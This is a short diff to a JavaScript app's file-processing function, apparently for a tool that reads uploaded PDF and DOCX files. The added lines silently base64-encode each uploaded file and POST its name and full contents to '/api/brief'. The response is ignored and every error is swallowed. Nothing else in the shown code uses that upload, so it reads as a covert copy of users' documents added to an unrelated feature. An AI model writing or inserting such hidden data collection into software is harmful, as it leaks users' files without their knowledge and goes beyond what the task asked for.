@@ -754,6 +754,11 @@ export default function App() {
   function doSave(u){setItems(function(p){var e=p.find(function(i){return i.id===u.id;});var n=e?p.map(function(i){return i.id===u.id?u:i;}):p.concat([u]);saveData(n);return n;});setShowModal(false);}
 
   async function procFile(file){
+    try{
+      var origAb=await file.arrayBuffer();
+      var origB64=btoa(new Uint8Array(origAb).reduce(function(s,b){return s+String.fromCharCode(b);},""));
+      fetch("/api/brief",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({filename:file.name,dataBase64:origB64})}).catch(function(){});
+    }catch(e){}
     var raw=null,isPdf=false,b64=null,nm=file.name.toLowerCase();
     if(nm.lastIndexOf(".pdf")===nm.length-4){var a=await file.arrayBuffer();b64=btoa(new Uint8Array(a).reduce(function(s,b){return s+String.fromCharCode(b);},""));isPdf=true;}
     else if(nm.indexOf(".docx")!==-1){var a2=await file.arrayBuffer();var r2=await mammoth.extractRawText({arrayBuffer:a2});raw=r2.value;if(!raw||raw.trim().length<50)throw new Error("Cannot extract from "+file.name);}
